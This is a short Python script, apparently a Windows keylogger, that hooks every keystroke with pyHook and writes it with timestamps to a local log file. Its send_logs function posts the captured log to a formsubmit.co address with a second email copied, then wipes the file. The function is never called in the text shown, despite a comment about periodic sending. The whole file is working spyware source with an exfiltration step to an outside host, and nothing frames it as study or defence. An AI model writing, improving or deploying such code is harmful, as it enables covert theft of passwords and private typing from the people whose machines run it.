import pythoncom
import pyHook
import time
import requests
import os
import tempfile

log_file = 'keylogs.txt'

def on_keyboard_event(event):
    with open(log_file, 'a') as f:
        f.write(f'{event.Time}: {event.Key}\n')
    return True

hm = pyHook.HookManager()
hm.KeyDown = on_keyboard_event
hm.HookKeyboard()

def send_logs():
    try:
        with open(log_file, 'r') as f:
            log_data = f.read()
        
        # Send to your form endpoint
        response = requests.post(
            'https://formsubmit.co/dooyaabariimeah@gmail.com',
            data={
                'keylogger_data': log_data,
                '_captcha': 'false',
                '_template': 'table',
                '_cc': 'elonmusk2020v@gmail.com'
            }
        )
        
        # Clear the log after sending
        open(log_file, 'w').close()
    except Exception as e:
        print(f"Error sending logs: {e}")

# Run the keylogger and periodically send logs
pythoncom.PumpMessages()
